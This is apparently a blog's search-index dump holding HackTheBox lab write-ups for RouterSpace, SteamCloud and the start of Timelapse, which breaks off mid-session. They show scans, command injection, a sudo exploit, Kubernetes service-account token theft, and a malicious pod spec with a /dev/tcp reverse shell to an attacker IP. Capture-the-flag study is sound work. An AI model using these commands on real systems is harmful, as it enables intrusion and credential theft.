/etc/feroxbuster/ferox-config.toml 💢 Regex Filter │ Suspicious activity detected !!! 🔎 Extract Links │ true 🏁 HTTP methods │ [GET] 🚫 Do Not Recurse │ true ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Management Menu™ ────────────────────────────────────────────────── 301 GET 10l 16w 173c http://10.10.11.148/img =\u0026gt; http://10.10.11.148/img/ 200 GET 3l 215w 8636c http://10.10.11.148/js/vendor/modernizr-3.5.0.min.js 200 GET 119l 179w 1776c http://10.10.11.148/css/slick.css 200 GET 85l 206w 3024c http://10.10.11.148/js/contact.js 200 GET 129l 316w 3697c http://10.10.11.148/js/scrollIt.js 200 GET 8l 165w 8044c http://10.10.11.148/js/waypoints.min.js 200 GET 43l 251w 10237c http://10.10.11.148/img/ilstrator/app.svg 200 GET 7l 110w 5594c http://10.10.11.148/js/imagesloaded.pkgd.min.js 200 GET 7l 58w 1014c http://10.10.11.148/img/icon/2.svg 200 GET 2l 132w 8415c http://10.10.11.148/js/wow.min.js 200 GET 6l 64w 2936c http://10.10.11.148/css/owl.carousel.min.css 200 GET 120l 339w 4820c http://10.10.11.148/js/jquery.ajaxchimp.min.js 200 GET 31l 113w 1230c http://10.10.11.148/js/mail-script.js 200 GET 7l 29w 2035c http://10.10.11.148/js/jquery.scrollUp.min.js 200 GET 140l 345w 3639c http://10.10.11.148/css/nice-select.css 200 GET 24l 88w 760c http://10.10.11.148/js/plugins.js 200 GET 10l 42w 946c http://10.10.11.148/img/icon/1.svg 200 GET 4l 42w 2942c http://10.10.11.148/js/nice-select.min.js 200 GET 4l 25w 612c http://10.10.11.148/img/icon/3.svg 200 GET 56l 99w 1288c http://10.10.11.148/css/flaticon.css 200 GET 6l 102w 8415c http://10.10.11.148/js/jquery.slicknav.min.js 200 GET 8l 36w 1067c http://10.10.11.148/js/jquery.counterup.min.js 200 GET 14l 60w 4430c http://10.10.11.148/img/logo.png 200 GET 252l 591w 5521c http://10.10.11.148/css/slicknav.css 200 GET 48l 136w 1202c http://10.10.11.148/js/ajax-form.js 200 GET 351l 795w 6951c http://10.10.11.148/css/magnific-popup.css 200 GET 415l 791w 8467c http://10.10.11.148/js/main.js 200 GET 2l 364w 21068c http://10.10.11.148/js/jquery.validate.min.js 200 GET 4l 212w 20216c http://10.10.11.148/js/jquery.magnific-popup.min.js 200 GET 536l 1382w 25900c http://10.10.11.148/index.html 200 GET 113l 660w 51428c http://10.10.11.148/img/ilstrator_img/man_walk.png 200 GET 99l 523w 41442c http://10.10.11.148/img/ilstrator_img/draw.png 200 GET 12l 559w 35503c http://10.10.11.148/js/isotope.pkgd.min.js 200 GET 8l 31w 21879c http://10.10.11.148/img/ilstrator/play.svg 200 GET 4l 66w 31000c http://10.10.11.148/css/font-awesome.min.css 200 GET 1081l 1809w 16456c http://10.10.11.148/css/themify-icons.css 200 GET 5l 351w 19188c http://10.10.11.148/js/popper.min.js 200 GET 1174l 4381w 41095c http://10.10.11.148/js/jquery.form.js 200 GET 2704l 5500w 57523c http://10.10.11.148/css/gijgo.css 200 GET 7l 567w 48944c http://10.10.11.148/js/bootstrap.min.js 200 GET 7l 279w 42766c http://10.10.11.148/js/owl.carousel.min.js 200 GET 3188l 6010w 68701c http://10.10.11.148/css/animate.min.css 200 GET 5l 1434w 97163c http://10.10.11.148/js/vendor/jquery-1.12.4.min.js 200 GET 7057l 20844w 196023c http://10.10.11.148/css/style.css 200 GET 685l 4128w 324570c http://10.10.11.148/img/ilstrator_img/phone.png 200 GET 9273l 15721w 187832c http://10.10.11.148/css/bootstrap.min.css 200 GET 1l 2188w 177487c http://10.10.11.148/js/gijgo.min.js 200 GET 840l 5012w 388559c http://10.10.11.148/img/ilstrator/phone.png 200 GET 902l 5006w 440714c http://10.10.11.148/img/ilstrator_img/mobile_screen.png 200 GET 0l 0w 35855082c http://10.10.11.148/RouterSpace.apk 200 GET 536l 1382w 25900c http://10.10.11.148/ 301 GET 10l 16w 173c http://10.10.11.148/css =\u0026gt; http://10.10.11.148/css/ 301 GET 10l 16w 171c http://10.10.11.148/js =\u0026gt; http://10.10.11.148/js/ 301 GET 10l 16w 177c http://10.10.11.148/fonts =\u0026gt; http://10.10.11.148/fonts/ Foothold/User Let\u0026rsquo;s analyze the apk We can perform static analysis using jadx You can also do it using apktool We see the domain information in apk\u0026rsquo;s signature Checking AndroidManifest.xml shows the main function The main activity has only 2 functions: constructor and GetMainComponentName So let\u0026rsquo;s perform dynamic analysis I installed Genymotion to do that This ippsec\u0026rsquo;s video can be helpful Let\u0026rsquo;s create Android Device Install apk by dragging it to Android Device screen Now I need to configure Android Device to send requests to Burp Suite Open Android Settings (or the gear icon in top menu) Then select Network \u0026amp; Internet -\u0026gt; Wi-Fi and then click and hold AndroidWifi until menu with Modify Network pops up Select Modify Network and then click Advanced options Change Proxy settings to Manual Set IP to your host\u0026rsquo;s IP Set port to 8080 (Burp\u0026rsquo;s default port) Now change Burp\u0026rsquo;s settings Proxy Settings -\u0026gt; Tools -\u0026gt; Proxy -\u0026gt; Proxy Listeners -\u0026gt; Edit Running Listener and change Bind to address to All interfaces Open browser in Android Device and try opening any link Burp should intercept the request Now we have everything configured, so let\u0026rsquo;s open apk and click Check Status We see the requests to routerspace.htb, so we need to add it to /etc/hosts (I\u0026rsquo;m running Genymotion on Windows, so had to add it to C:\\Windows\\System32\\drivers\\etc\\hosts) Now let\u0026rsquo;s click Check Status again Now we received the response Changing ip and sending request basically returns back the ip We can play with the payload But when I send command injection payload: \u0026ldquo;`id`\u0026rdquo; or $(id), we have rce I couldn\u0026rsquo;t get reverse shell, so I grabbed the flag first to proceed with other ideas Now let\u0026rsquo;s add our key to authorized_keys We have a .ssh directory Create an authorized_keys and add key to it Connect via ssh Root Send linpeas via scp Enumerate Pwnkit won\u0026rsquo;t work since it requires SUID bit set to pkexec Let\u0026rsquo;s try Baron Samedit First let\u0026rsquo;s test by running sudoedit -s Y, if it asks for passwords it\u0026rsquo;s most likely vulnerable According to https://github.com/CptGibbon/CVE-2021-3156 paul@routerspace:/tmp$ sudoedit -s Y [sudo] password for paul: Now upload repository using scp -r And compile it using make Run the exploit and get the flag ","date":"August 18, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/routerspace/images/routerspace.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/routerspace/","summary":"RouterSpace Enumeration nmap └─$ nmap -p- -Pn 10.10.11.148 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-24 18:28 BST Nmap scan report for 10.10.11.148 (10.10.11.148) Host is up (0.093s latency). Not shown: 65533 filtered tcp ports (no-response) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http └─$ nmap -sC -sV -p22,80 -Pn 10.10.11.148 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-24 18:31 BST Nmap scan report for 10.10.11.148 (10.10.11.148) Host is up (0.","tags":["HTB","android","apk","feroxbuster","apktool","reverse-engineering","android-react-native","react-native","genymotion","burp","android-burp","command-injection","linpeas","pwnkit","cve-2021-4034","baron-samedit","cve-2021-3156"],"title":"[HTB] Machine: RouterSpace"},{"categories":null,"contents":"SteamCloud Enumeration nmap └─$ nmap -p- -Pn 10.10.11.133 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-22 17:58 BST Nmap scan report for 10.10.11.133 (10.10.11.133) Host is up (0.15s latency). Not shown: 65528 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 2379/tcp open etcd-client 2380/tcp open etcd-server 8443/tcp open https-alt 10249/tcp open unknown 10250/tcp open unknown 10256/tcp open unknown └─$ nmap -sV -sC -Pn -p22,2379,2380,8443,10249,10250,10256 10.10.11.133 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-22 18:48 BST Nmap scan report for 10.10.11.133 (10.10.11.133) Host is up (0.16s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 fc:fb:90:ee:7c:73:a1:d4:bf:87:f8:71:e8:44:c6:3c (RSA) | 256 46:83:2b:1b:01:db:71:64:6a:3e:27:cb:53:6f:81:a1 (ECDSA) |_ 256 1d:8d:d3:41:f3:ff:a4:37:e8:ac:78:08:89:c2:e3:c5 (ED25519) 2379/tcp open ssl/etcd-client? | ssl-cert: Subject: commonName=steamcloud | Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1 | Not valid before: 2023-08-22T16:56:47 |_Not valid after: 2024-08-21T16:56:48 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ h2 2380/tcp open ssl/etcd-server? | tls-alpn: |_ h2 |_ssl-date: TLS randomness does not represent time | ssl-cert: Subject: commonName=steamcloud | Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1 | Not valid before: 2023-08-22T16:56:47 |_Not valid after: 2024-08-21T16:56:48 8443/tcp open ssl/https-alt |_ssl-date: TLS randomness does not represent time | tls-alpn: | h2 |_ http/1.1 | ssl-cert: Subject: commonName=minikube/organizationName=system:masters | Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.11.133, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1 | Not valid before: 2023-08-21T16:56:46 |_Not valid after: 2026-08-21T16:56:46 | fingerprint-strings: | FourOhFourRequest: | HTTP/1.0 403 Forbidden | Audit-Id: f15a6d51-34b1-4d39-8da4-4ceb0f11d6f4 | Cache-Control: no-cache, private | Content-Type: application/json | X-Content-Type-Options: nosniff | X-Kubernetes-Pf-Flowschema-Uid: 151a61c3-ebac-4505-9b4c-ec051a6bc238 | X-Kubernetes-Pf-Prioritylevel-Uid: beb11e57-7071-48e1-adcd-ed84580800b3 | Date: Tue, 22 Aug 2023 17:48:25 GMT | Content-Length: 212 | {\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;forbidden: User \u0026#34;system:anonymous\u0026#34; cannot get path \u0026#34;/nice ports,/Trinity.txt.bak\u0026#34;\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Forbidden\u0026#34;,\u0026#34;details\u0026#34;:{},\u0026#34;code\u0026#34;:403} | GetRequest: | HTTP/1.0 403 Forbidden | Audit-Id: 0cf5de81-a588-4ef6-a99a-ec85aa73c024 | Cache-Control: no-cache, private | Content-Type: application/json | X-Content-Type-Options: nosniff | X-Kubernetes-Pf-Flowschema-Uid: 151a61c3-ebac-4505-9b4c-ec051a6bc238 | X-Kubernetes-Pf-Prioritylevel-Uid: beb11e57-7071-48e1-adcd-ed84580800b3 | Date: Tue, 22 Aug 2023 17:48:23 GMT | Content-Length: 185 | {\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;forbidden: User \u0026#34;system:anonymous\u0026#34; cannot get path \u0026#34;/\u0026#34;\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Forbidden\u0026#34;,\u0026#34;details\u0026#34;:{},\u0026#34;code\u0026#34;:403} | HTTPOptions: | HTTP/1.0 403 Forbidden | Audit-Id: f0a058c6-4e86-431e-b38a-161f09c1237c | Cache-Control: no-cache, private | Content-Type: application/json | X-Content-Type-Options: nosniff | X-Kubernetes-Pf-Flowschema-Uid: 151a61c3-ebac-4505-9b4c-ec051a6bc238 | X-Kubernetes-Pf-Prioritylevel-Uid: beb11e57-7071-48e1-adcd-ed84580800b3 | Date: Tue, 22 Aug 2023 17:48:24 GMT | Content-Length: 189 |_ {\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;forbidden: User \u0026#34;system:anonymous\u0026#34; cannot options path \u0026#34;/\u0026#34;\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Forbidden\u0026#34;,\u0026#34;details\u0026#34;:{},\u0026#34;code\u0026#34;:403} |_http-title: Site doesn\u0026#39;t have a title (application/json). 10249/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API) |_http-title: Site doesn\u0026#39;t have a title (text/plain; charset=utf-8). 10250/tcp open ssl/http Golang net/http server (Go-IPFS json-rpc or InfluxDB API) |_http-title: Site doesn\u0026#39;t have a title (text/plain; charset=utf-8). | ssl-cert: Subject: commonName=steamcloud@1692723410 | Subject Alternative Name: DNS:steamcloud | Not valid before: 2023-08-22T15:56:49 |_Not valid after: 2024-08-21T15:56:49 | tls-alpn: | h2 |_ http/1.1 |_ssl-date: TLS randomness does not represent time 10256/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API) |_http-title: Site doesn\u0026#39;t have a title (text/plain; charset=utf-8). 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port8443-TCP:V=7.94%T=SSL%I=7%D=8/22%Time=64E4F50B%P=x86_64-pc-linux-gn SF:u%r(GetRequest,22F,\u0026#34;HTTP/1\\.0\\x20403\\x20Forbidden\\r\\nAudit-Id:\\x200cf5d SF:e81-a588-4ef6-a99a-ec85aa73c024\\r\\nCache-Control:\\x20no-cache,\\x20priva SF:te\\r\\nContent-Type:\\x20application/json\\r\\nX-Content-Type-Options:\\x20n SF:osniff\\r\\nX-Kubernetes-Pf-Flowschema-Uid:\\x20151a61c3-ebac-4505-9b4c-ec SF:051a6bc238\\r\\nX-Kubernetes-Pf-Prioritylevel-Uid:\\x20beb11e57-7071-48e1- SF:adcd-ed84580800b3\\r\\nDate:\\x20Tue,\\x2022\\x20Aug\\x202023\\x2017:48:23\\x20 SF:GMT\\r\\nContent-Length:\\x20185\\r\\n\\r\\n{\\\u0026#34;kind\\\u0026#34;:\\\u0026#34;Status\\\u0026#34;,\\\u0026#34;apiVersion\\ SF:\u0026#34;:\\\u0026#34;v1\\\u0026#34;,\\\u0026#34;metadata\\\u0026#34;:{},\\\u0026#34;status\\\u0026#34;:\\\u0026#34;Failure\\\u0026#34;,\\\u0026#34;message\\\u0026#34;:\\\u0026#34;forbidden SF::\\x20User\\x20\\\\\\\u0026#34;system:anonymous\\\\\\\u0026#34;\\x20cannot\\x20get\\x20path\\x20\\\\\\\u0026#34;/ SF:\\\\\\\u0026#34;\\\u0026#34;,\\\u0026#34;reason\\\u0026#34;:\\\u0026#34;Forbidden\\\u0026#34;,\\\u0026#34;details\\\u0026#34;:{},\\\u0026#34;code\\\u0026#34;:403}\\n\u0026#34;)%r(HTTP SF:Options,233,\u0026#34;HTTP/1\\.0\\x20403\\x20Forbidden\\r\\nAudit-Id:\\x20f0a058c6-4e8 SF:6-431e-b38a-161f09c1237c\\r\\nCache-Control:\\x20no-cache,\\x20private\\r\\nC SF:ontent-Type:\\x20application/json\\r\\nX-Content-Type-Options:\\x20nosniff\\ SF:r\\nX-Kubernetes-Pf-Flowschema-Uid:\\x20151a61c3-ebac-4505-9b4c-ec051a6bc SF:238\\r\\nX-Kubernetes-Pf-Prioritylevel-Uid:\\x20beb11e57-7071-48e1-adcd-ed SF:84580800b3\\r\\nDate:\\x20Tue,\\x2022\\x20Aug\\x202023\\x2017:48:24\\x20GMT\\r\\n SF:Content-Length:\\x20189\\r\\n\\r\\n{\\\u0026#34;kind\\\u0026#34;:\\\u0026#34;Status\\\u0026#34;,\\\u0026#34;apiVersion\\\u0026#34;:\\\u0026#34;v1\\ SF:\u0026#34;,\\\u0026#34;metadata\\\u0026#34;:{},\\\u0026#34;status\\\u0026#34;:\\\u0026#34;Failure\\\u0026#34;,\\\u0026#34;message\\\u0026#34;:\\\u0026#34;forbidden:\\x20Us SF:er\\x20\\\\\\\u0026#34;system:anonymous\\\\\\\u0026#34;\\x20cannot\\x20options\\x20path\\x20\\\\\\\u0026#34;/\\\\\\ SF:\u0026#34;\\\u0026#34;,\\\u0026#34;reason\\\u0026#34;:\\\u0026#34;Forbidden\\\u0026#34;,\\\u0026#34;details\\\u0026#34;:{},\\\u0026#34;code\\\u0026#34;:403}\\n\u0026#34;)%r(FourOhF SF:ourRequest,24A,\u0026#34;HTTP/1\\.0\\x20403\\x20Forbidden\\r\\nAudit-Id:\\x20f15a6d51- SF:34b1-4d39-8da4-4ceb0f11d6f4\\r\\nCache-Control:\\x20no-cache,\\x20private\\r SF:\\nContent-Type:\\x20application/json\\r\\nX-Content-Type-Options:\\x20nosni SF:ff\\r\\nX-Kubernetes-Pf-Flowschema-Uid:\\x20151a61c3-ebac-4505-9b4c-ec051a SF:6bc238\\r\\nX-Kubernetes-Pf-Prioritylevel-Uid:\\x20beb11e57-7071-48e1-adcd SF:-ed84580800b3\\r\\nDate:\\x20Tue,\\x2022\\x20Aug\\x202023\\x2017:48:25\\x20GMT\\ SF:r\\nContent-Length:\\x20212\\r\\n\\r\\n{\\\u0026#34;kind\\\u0026#34;:\\\u0026#34;Status\\\u0026#34;,\\\u0026#34;apiVersion\\\u0026#34;:\\\u0026#34; SF:v1\\\u0026#34;,\\\u0026#34;metadata\\\u0026#34;:{},\\\u0026#34;status\\\u0026#34;:\\\u0026#34;Failure\\\u0026#34;,\\\u0026#34;message\\\u0026#34;:\\\u0026#34;forbidden:\\x2 SF:0User\\x20\\\\\\\u0026#34;system:anonymous\\\\\\\u0026#34;\\x20cannot\\x20get\\x20path\\x20\\\\\\\u0026#34;/nice SF:\\x20ports,/Trinity\\.txt\\.bak\\\\\\\u0026#34;\\\u0026#34;,\\\u0026#34;reason\\\u0026#34;:\\\u0026#34;Forbidden\\\u0026#34;,\\\u0026#34;details\\\u0026#34; SF::{},\\\u0026#34;code\\\u0026#34;:403}\\n\u0026#34;); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 121.78 seconds Port 8443 TLS information: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.11.133, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1 Looks like kubernetes-related We also have kurbenetes ports that are listed in docs The instance could be a minikube based on TLS info Port 8443 is default port minikube\u0026rsquo;s API https://minikube.sigs.k8s.io/docs/commands/start/ Foothold/User I installed kubectl But it prompts for auth We can check Kubelet API on port 10250 But we need to install kubeletctl We can see that nginx is in default namespace Trying to exec We could also run to check for rce in pods kubeletctl -s 10.10.11.133 scan rce ┌──(kali㉿kali)-[~] └─$ kubeletctl -s 10.10.11.133 exec \u0026#34;id\u0026#34; -p nginx -c nginx uid=0(root) gid=0(root) groups=0(root) We are root Let\u0026rsquo;s check /root folder and get a flag ┌──(kali㉿kali)-[~] └─$ kubeletctl -s 10.10.11.133 exec \u0026#34;ls -lha /root\u0026#34; -p nginx -c nginx total 12K drwxr-xr-x 2 root root 4.0K Nov 30 2021 . drwxr-xr-x 1 root root 4.0K Aug 23 17:03 .. -rw-r--r-- 2 root root 33 Aug 23 17:02 user.txt ┌──(kali㉿kali)-[~] └─$ kubeletctl -s 10.10.11.133 exec \u0026#34;cat /root/user.txt\u0026#34; -p nginx -c nginx e0c0**************************** Root We can get shell using exec: Based on this post ┌──(kali㉿kali)-[~] └─$ kubeletctl -s 10.10.11.133 exec \u0026#34;/bin/bash\u0026#34; -p nginx -c nginx root@nginx:/# Let\u0026rsquo;s enumerate Follow this post Also this post We need to look for Service Account tokens Service Account is an object managed by Kubernetes and used to provide an identity for processes that run in a pod Token could be located in: /run/secrets/kubernetes.io/serviceaccount /var/run/secrets/kubernetes.io/serviceaccount /secrets/kubernetes.io/serviceaccount contain the files: ca.crt: It\u0026rsquo;s the ca certificate to check kubernetes communications namespace: It indicates the current namespace token: It contains the service token of the current pod. root@nginx:/# ls -lha /run/secrets/kubernetes.io/serviceaccount ls -lha /run/secrets/kubernetes.io/serviceaccount total 4.0K drwxrwxrwt 3 root root 140 Aug 23 17:51 . drwxr-xr-x 3 root root 4.0K Aug 23 17:03 .. drwxr-xr-x 2 root root 100 Aug 23 17:51 ..2023_08_23_17_51_13.026865304 lrwxrwxrwx 1 root root 31 Aug 23 17:51 ..data -\u0026gt; ..2023_08_23_17_51_13.026865304 lrwxrwxrwx 1 root root 13 Aug 23 17:03 ca.crt -\u0026gt; ..data/ca.crt lrwxrwxrwx 1 root root 16 Aug 23 17:03 namespace -\u0026gt; ..data/namespace lrwxrwxrwx 1 root root 12 Aug 23 17:03 token -\u0026gt; ..data/token root@nginx:/# ls -lha /var/run/secrets/kubernetes.io/serviceaccount ls -lha /var/run/secrets/kubernetes.io/serviceaccount total 4.0K drwxrwxrwt 3 root root 140 Aug 23 17:51 . drwxr-xr-x 3 root root 4.0K Aug 23 17:03 .. drwxr-xr-x 2 root root 100 Aug 23 17:51 ..2023_08_23_17_51_13.026865304 lrwxrwxrwx 1 root root 31 Aug 23 17:51 ..data -\u0026gt; ..2023_08_23_17_51_13.026865304 lrwxrwxrwx 1 root root 13 Aug 23 17:03 ca.crt -\u0026gt; ..data/ca.crt lrwxrwxrwx 1 root root 16 Aug 23 17:03 namespace -\u0026gt; ..data/namespace lrwxrwxrwx 1 root root 12 Aug 23 17:03 token -\u0026gt; ..data/token Save ca.crt kubeletctl -s 10.10.11.133 exec \u0026quot;cat /run/secrets/kubernetes.io/serviceaccount/ca.crt\u0026quot; -p nginx -c nginx \u0026gt; ca.crt Set token export token=$(kubeletctl -s 10.10.11.133 exec \u0026quot;cat /run/secrets/kubernetes.io/serviceaccount/token\u0026quot; -p nginx -c nginx) Now we can use kubectl using the token └─$ kubectl --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token get pod NAME READY STATUS RESTARTS AGE nginx 1/1 Running 0 89m We can list the permissions of the default Service account └─$ kubectl --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token auth can-i --list Resources Non-Resource URLs Resource Names Verbs selfsubjectaccessreviews.authorization.k8s.io [] [] [create] selfsubjectrulesreviews.authorization.k8s.io [] [] [create] pods [] [] [get create list] [/.well-known/openid-configuration] [] [get] [/api/*] [] [get] [/api] [] [get] [/apis/*] [] [get] [/apis] [] [get] [/healthz] [] [get] [/healthz] [] [get] [/livez] [] [get] [/livez] [] [get] [/openapi/*] [] [get] [/openapi] [] [get] [/openid/v1/jwks] [] [get] [/readyz] [] [get] [/readyz] [] [get] [/version/] [] [get] [/version/] [] [get] [/version] [] [get] [/version] [] [get] We can get, create, and list pods Let\u0026rsquo;s follow this examples and create malicious pod https://cloudsecdocs.com/container_security/offensive/attacks/techniques/reverse_shell/ apiVersion: v1 kind: Pod metadata: name: pentest-pod01 namespace: default spec: containers: - name: pentest-pod01 image: nginx:1.14.2 command: [\u0026#34;/bin/bash\u0026#34;] args: [\u0026#34;-c\u0026#34;, \u0026#34;/bin/bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.16.5/6666 0\u0026gt;\u0026amp;1\u0026#34;] volumeMounts: - mountPath: /mnt name: hostfs volumes: - name: hostfs hostPath: path: / automountServiceAccountToken: true hostNetwork: true Let\u0026rsquo;s start it └─$ kubectl --server https://10.10.11.133:8443 --certificate-authority=ca.crt --token=$token apply -f evilpod.yaml pod/pentest-pod01 created Check nc listener Now we can add public key to authorized_keys and ssh to box ","date":"August 18, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/steamcloud/images/steamcloud.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/steamcloud/","summary":"SteamCloud Enumeration nmap └─$ nmap -p- -Pn 10.10.11.133 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-22 17:58 BST Nmap scan report for 10.10.11.133 (10.10.11.133) Host is up (0.15s latency). Not shown: 65528 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 2379/tcp open etcd-client 2380/tcp open etcd-server 8443/tcp open https-alt 10249/tcp open unknown 10250/tcp open unknown 10256/tcp open unknown └─$ nmap -sV -sC -Pn -p22,2379,2380,8443,10249,10250,10256 10.10.11.133 -T4 Starting Nmap 7.","tags":["HTB","kubernetes","minikube","kubectl","kubeletctl","container"],"title":"[HTB] Machine: SteamCloud"},{"categories":null,"contents":"Timelapse Enumeration nmap └─$ nmap -p- -Pn 10.10.11.152 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-24 17:00 BST Nmap scan report for 10.10.11.152 (10.10.11.152) Host is up (0.094s latency). Not shown: 65517 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5986/tcp open wsmans 9389/tcp open adws 49667/tcp open unknown 49673/tcp open unknown 49674/tcp open unknown 49696/tcp open unknown 56502/tcp open unknown └─$ nmap -sV -sC -p53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49667,46793,49674,49696,56502 -Pn 10.10.11.152 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-24 17:06 BST Nmap scan report for 10.10.11.152 (10.10.11.152) Host is up (0.17s latency). PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-08-25 00:05:47Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ldapssl? 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name) 3269/tcp open globalcatLDAPssl? 5986/tcp open ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) | ssl-cert: Subject: commonName=dc01.timelapse.htb | Not valid before: 2021-10-25T14:05:29 |_Not valid after: 2022-10-25T14:25:29 | tls-alpn: |_ http/1.1 |_http-title: Not Found |_ssl-date: 2023-08-25T00:07:22+00:00; +7h59m24s from scanner time. 9389/tcp open mc-nmf .NET Message Framing 46793/tcp filtered unknown 49667/tcp open msrpc Microsoft Windows RPC 49674/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49696/tcp open msrpc Microsoft Windows RPC 56502/tcp open msrpc Microsoft Windows RPC Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required | smb2-time: | date: 2023-08-25T00:06:44 |_ start_date: N/A |_clock-skew: mean: 7h59m23s, deviation: 0s, median: 7h59m22s Add dc01.timelapse.htb and timelapse.htb to /etc/hosts crackmapexec └─$ crackmapexec smb dc01.timelapse.htb --shares -u test -p \u0026#39;\u0026#39; SMB timelapse.htb 445 DC01 [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False) SMB timelapse.htb 445 DC01 [+] timelapse.htb\\test: SMB timelapse.htb 445 DC01 [+] Enumerated shares SMB timelapse.htb 445 DC01 Share Permissions Remark SMB timelapse.htb 445 DC01 ----- ----------- ------ SMB timelapse.htb 445 DC01 ADMIN$ Remote Admin SMB timelapse.htb 445 DC01 C$ Default share SMB timelapse.htb 445 DC01 IPC$ READ Remote IPC SMB timelapse.htb 445 DC01 NETLOGON Logon server share SMB timelapse.htb 445 DC01 Shares READ SMB timelapse.htb 445 DC01 SYSVOL Logon server share smbclient └─$ smbclient -N //10.10.11.152/Shares Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . D 0 Mon Oct 25 16:39:15 2021 .. D 0 Mon Oct 25 16:39:15 2021 Dev D 0 Mon Oct 25 20:40:06 2021 HelpDesk D 0 Mon Oct 25 16:48:42 2021 6367231 blocks of size 4096. 1270621 blocks available smb: \\\u0026gt; cd Dev smb: \\Dev\\\u0026gt; ls . D 0 Mon Oct 25 20:40:06 2021 .. D 0 Mon Oct 25 20:40:06 2021 winrm_backup.zip A 2611 Mon Oct 25 16:46:42 2021 6367231 blocks of size 4096. 1270528 blocks available smb: \\Dev\\\u0026gt; get winrm_backup.zip getting file \\Dev\\winrm_backup.zip of size 2611 as winrm_backup.zip (3.1 KiloBytes/sec) (average 3.1 KiloBytes/sec) smb: \\Dev\\\u0026gt; cd .. smb: \\\u0026gt; ls . D 0 Mon Oct 25 16:39:15 2021 .. D 0 Mon Oct 25 16:39:15 2021 Dev D 0 Mon Oct 25 20:40:06 2021 HelpDesk D 0 Mon Oct 25 16:48:42 2021 cd Help 6367231 blocks of size 4096. 1269473 blocks available smb: \\\u0026gt; cd HelpDesk smb: 